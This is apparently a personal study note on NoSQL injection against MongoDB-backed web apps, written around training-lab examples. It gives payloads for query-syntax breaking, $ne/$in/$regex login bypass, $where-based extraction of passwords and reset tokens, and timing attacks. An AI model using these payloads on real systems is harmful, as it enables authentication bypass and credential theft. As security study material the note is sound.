#NoSQL #Completed 

![[NoSQL Injections.webp]]
# NoSQL Types

Two different types of NoSQL injection:

- Syntax injection - occurs when you break the NoSQL query syntax and injecting your own payload. Similiar to SQL injection, but the nature varies as NoSQL databases use a range of query languages, types of query syntax, and different data structures.
- Operator injection - using NoSQL query operators to manipulate queries.
# NoSQL Syntax Injection

Detect NoSQL injection by attempting to break the query syntax. Systematically test each input by submitting fuzz strings and special characters to trigger a database error or other detectable behaviour if it is not sanitized or filtered.

>[!info]
>Use a variety of fuzz strings to target multiple API languages.

For example, when a user chooses Fizzy Drinks category on a site, it requests the following:

```html
https://insecure-website.com/product/lookup?category=fizzy
```

It causes the app to send a JSON query to grab products from the product collection in MongoDB:

```json
this.category == 'fizzy'
```

Test if the input is vulnerable by fuzzing in the category parameter such as the following:

```json
'"`{
;$Foo}
$Foo \xYZ
```

Forge the attack:

```html
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

If change occurs, it indicates the user input is not filtered or sanitized. In some applications, you may need to inject your payload via a JSON property instead. In this case, this payload would become:

```json
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000.
```

Additionally, determine which characters are interpreted as syntax by injecting individual characters. For example, submitting `'` which results in the following:

```json
this.category == '''
```

If the response changed, it indicates the character broke the query. To confirm, submit a valid query string:

```json
this.category == '\''
```

If it does not change, it means the app is vulnerable. Afterwards, determine if you can influence boolean conditions. To test, send two requests, one with a false condition and one with a true condition such as:

- `' && 0 && 'z`
- `' && 1 && 'x`

```html
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
```

If it behaves differently, the false condition impacts query logic, but true condition doesn't, indicating injecting it impacts a server-side query.

Attempt to override existing conditions by injecting a JavaScript condition that is always TRUE:

- `'||1||'`

Which may result in:

```json
this.category == 'fizzy'||'1'=='1'
```

Since it's always TRUE, it returns all items, viewing all products in any category.

>[!danger]
>Take care when injecting a condition that always evaluates to true into a NoSQL query. Although this may be harmless in the initial context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If an application uses it when updating or deleting data, for example, this can result in accidental data loss.

Also try adding a null character after the category value. MongoDB may ignore all characters after a null byte. As an example, there may be a hidden query:

```json
this.category == 'fizzy' && this.released == 1
```

A payload could be injected:

```html
https://insecure-website.com/product/lookup?category=fizzy'%00
```

Which results in:

```json
this.category == 'fizzy'\u0000' && this.released == 1
```

If it ignores all characters after null byte, it removes the requirement.
# Detecting NoSQL Injection

Try to find anywhere where some query is being ran on the backend such as a category filter on an e-commerce site. Try submitting a single quote character - `'`. If it causes an error or weird behaviour, it's likely vulnerable.

Attempt to submit a valid JS payload in the value of the parameter such as the following and URL encode:

```javascript
Gifts'+'
```

If no syntax error appears, it shows a form of injection is occurring. 

Identify if boolean conditions can be injected:

```javascript
Gifts' && 0 && 'x
Gifts' && 1 && 'x
```

One may show nothing, while one shows the products as normal. 

Try submitting a boolean payload that evaluates to TRUE:

```json
Gifts'||1||'
```
# NoSQL Operator Injection

NoSQL uses query operators including the following:

- `$where` - matches documents that satisfy JS expression
- `$ne` - matches values not equal to a value
- `$in` - matches all values specified in an array
- `$regex` - select documents where values match a specific regex

Try submitting different operators in a range of user inputs and review the responses for error messages or other changes. 

For JSON, insert query operators as nested objects where it may become:

```json
{"username":"wiener"} # original
{"username":{"$ne":"invalid"}} # modified
```

For URLs, insert query operators via URL parameters such as:

```javascript
username=wiener // original
username[$ne]=invalid // modified
```

Make sure to try:

- Converting request method
- Change Content-Type to application/json
- Add JSON to message body
- Inject query operators in JSON

A vulnerable app may accept a username/password in a POST request:

```json
{"username":"wiener","password":"peter"}
```

Test each input with different operators - e.g. test the username input via:

```json
{"username":{"$ne":"invalid"},"password":{"peter"}}
```

If applied, it queries all users that are not the user of `invalid`. If both fields process operators, bypass authentication via:

```json
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

Query would return all login creds for all users that are not `invalid` user - i.e. logged in as the first user (often the admin). For targeting an account, use the following:

```json
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

>[!info]
>This looks for where the username is either admin, administrator or superadmin and the password is not empty (i.e. any user submitted password).

As for exploiting in a real scenario:

1. Change the value of username to `{"$ne":"invalid"}` - check if it still logs you in
2. Change the value of username to `{"$regex":"wien.*"}` - check if it still logs you in
3. Set the username and password to `{"$ne":"invalid"}` - check for any error messages/responses that indicate multiple users were selected.
4. Change username to `{"$regex":"admin.*"}` and password to `{"$ne":""}` to attempt to login as admin
# Exploiting Syntax Injection to Extract Data

Some operators/functions can run limited JavaScript such as `$where` and `mapReduce()` function. If an app uses them, the database can evaluate JavaScript as part of the query.

As an example, there is a function to look up other registered usernames:

```html
https://insecure-website.com/user/lookup?username=admin
```

Resulting in:

```json
{"$where":"this.username == 'admin'"}
```

Attempt to inject JavaScript's functions into the query so it returns sensitive data such as the following to return the first character of the user's password:

```json
admin' && this.password[0] == 'a' || 'a'=='b
```

Or by using `match()` to extract information such as identifying if the password contains digits or not:

```json
admin' && this.password.match(/\d/) || 'a'=='b
```

In NoSQL like MongoDB, you must identify valid fields before extraction. To identify if a password field exists:

```html
https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'
```

Try sending it multiple times - field that does and field that does not exist such as:

```json
admin' && this.username!=' # does exist
admin' && this.foo!=' # does not exist
```

If password exists, the response would be identical to the response for username field (existing), but different for the field that does not (foo).

>[!info]
>Perform a dictionary attack via a wordlist to cycle different potential field names or extract field names by characters to identify field names without guessing.

A real world example may be a user lookup function. Try submitting a single `'` character in the user parameter and see if an error appears. If so, try submitting a JS payload such as `wiener'+'` and URL encode it - if details return, it may indicate it is vulnerable.

Next, identify if you can inject boolean conditions such as:

```json
wiener' && '1'=='2
```

It should not return any results as the boolean condition is FALSE. Try a TRUE payload as well and see if it triggers a different response:

```json
wiener' && '1'=='1
```

To identify the password length of a potential username, use the following:

```json
administrator' && this.password.length < 30 || 'a'=='b
```

If the password is less than 30 characters, it may return the account details. If not, it may return an error. Try modifying the password length down until you hit an error.

To extract the full password, use a cluster bomb attack with the payload:

```json
administrator' && this.password[§0§]=='§a§
```

- First payload is the length of the password (e.g. 0-9)
- Second payload is the characters of the password (a-z)
# Exploiting NoSQL Operator Injection to Extract Data

If original query does not use any operators, try injecting one of the operators yourself and using boolean conditions to determine if the app executes any JavaScript injected. For example:

```json
{"username":"wiener","password":"peter"}
```

To test, try injecting operators such as `$where` as an additional parameter and send a request where the condition is FALSE and one where TRUE:

```json
{"username":"wiener","password":"peter", "$where":"0"}
{"username":"wiener","password":"peter", "$where":"1"}
```

If it differs, it indicates evaluation. 

Try using the `keys()` method to extract names of data fields such as:

```json
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```

It inspects first data field and returns the first character of the field name - use Intruder to automate the process for the rest of the characters.

Alternatively, try extracting data using operators that don't need JavaScript such as `$regex`. Consider the following example request:

```json
{"username":"myuser","password":"mypass"}
```

Start testing whether the `$regex` operator is processed:

```json
{"username":"admin","password":{"$regex":"^.*"}}
```

Check if response differs from an incorrect password submission. If so, use the `$regex` operator to extract data character by character via:

```json
{"username":"admin","password":{"$regex":"^a*"}}
```

It checks if the password begins with `a`.

As a lab example, it may be possible to enumerate various things by first changing the password parameter during login to `{"$ne":"invalid"}` and checking the response. In certain cases, it may not return the standard wrong password, but an account locked message, indicating the operator was accepted.

Additionally, try using forgotten password functionality as well. 

Try adding `"$where": "0"` as an additional parameter such as:

```json
{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}
```

If the standard invalid message appears, try changing it from 0 to 1 and see if it changes again. If so, use Intruder with a new payload such as:

```json
{"username":"carlos","password":{"$ne":"invalid"}, "$where":"Object.keys(this)[1].match('^.{§§}§§.*')"}
```

And select payload 1 as 0-20 (length) and payload 2 as characters (a-zA-Z0-9) - enumerates the potential fields on the user object. To identify more, change the `[1]` to `[2]` and so on. 

Hidden fields may be revealed like "passwdResetToken". Attempt to use the parameter in the forgotten password request with an invalid value to see if an "invalid value" error appears. If so, it's vulnerable.

To extract the value of a user's reset token, use the following:

```json
{"username":"carlos","password":{"$ne":"invalid"}, "$where":"this.YOURTOKENNAME.match('^.{§§}§§.*')"}
```

Use the value to reset the specific user's password and login as the victim.
# Timing Based Injection

Sometimes, triggering an error won't cause a difference in responses. Try to trigger a conditional time delay via:

- Loading the page many times to determine baseline time
- Insert timing based payload to cause a delay in response such as `${"where": "sleep(5000)"}` 
- Identify if response loads slowly

Some payloads below will trigger time delays if the password begins with `a`:

```json
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
```

```json
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```

